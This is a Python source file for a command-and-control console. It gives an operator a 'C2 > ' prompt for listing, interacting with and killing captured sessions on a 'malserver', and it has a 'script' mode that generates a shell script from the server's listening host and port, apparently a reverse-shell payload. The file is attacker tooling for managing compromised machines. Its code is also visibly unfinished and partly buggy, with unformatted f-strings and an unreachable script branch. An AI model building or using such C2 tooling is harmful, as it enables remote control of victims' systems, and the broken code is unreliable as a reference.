import Server
import ScriptMaker
import argparse
import shlex

class HandlerPrompt:
    def __init__(self, ms: Server.ServerConfig):
        self.history = []
        self.promptType = 0
        self.malserver = ms
        self.isess = None

    def PromptType(self, pt: int):
        if pt == -1 :
            return self.promptType
        self.promptType = pt

def ProcessCommand(handle:HandlerPrompt):
    MalServerActive = True
    cmd = ""
    inputStr = "C2 > "

    while (MalServerActive):
        cmd = str(input(inputStr))
        cmd_args = shlex.split(cmd)  # Properly split the string into arguments

        if cmd.lower() == "exit":
            if handle.PromptType(-1) == 0:
                # Close Down Server
                handle.malserver.ReadyShutdown()
                MalServerActive = False
            else:
                # Exit Session Prompt and Shift to C2 Prompt
                handle.PromptType(0)
                inputStr = "C2 > "
        else:
            # Process the Command based on Prompt Type
            if handle.PromptType(-1) == 0:
                try:
                    if "script" not in cmd.lower():
                        # Default C2 Prompt
                        parser = argparse.ArgumentParser()
                        parser.add_argument("-i", "--interact", type=int, help="")
                        parser.add_argument("-k", "--kill", type=int, help="")
                        parser.add_argument('-K', "--kill-all", action='store_true', help="")
                        args = parser.parse_args(cmd_args)

                        if args.kill_all:
                            # Kill All Sessions
                            print("[*] Killing All Sessions. . .")
                            handle.malserver.KillSessions()
                        else:
                            if args.interact is not None:
                                print("[*] Attempting to Interact with SessionID: {args.interact}")

                                # Set session to interact with
                                handle.isess = handle.malserver.GetSessions()[args.interact]

                                # Enter Interactive Session
                                handle.PromptType(1)
                            elif args.kill is not None:
                                print("[*] Attempting to Kill SessionID: {args.kill}")
                                handle.isess = handle.malserver.GetSessions().remove(args.kill)
                                inputStr = "C2 > "
                    else:
                        # Create a shell script based off malserver details
                        handle.PromptType(1)
                        inputStr = "Script > "
                except SystemExit:
                    continue

            elif handle.PromptType(-1) == 1:
                # Captured Session Prompt : inputStr based on
                # recv buffer from client session selected
                inputStr = ""
            elif handle.PromptType(-1) == 2:
                # Create a shell script based off malserver details
                ScriptMaker.CreateScript(handle.malserver.GetLhost(),handle.malserver.GetLport())
                handle.PromptType(0)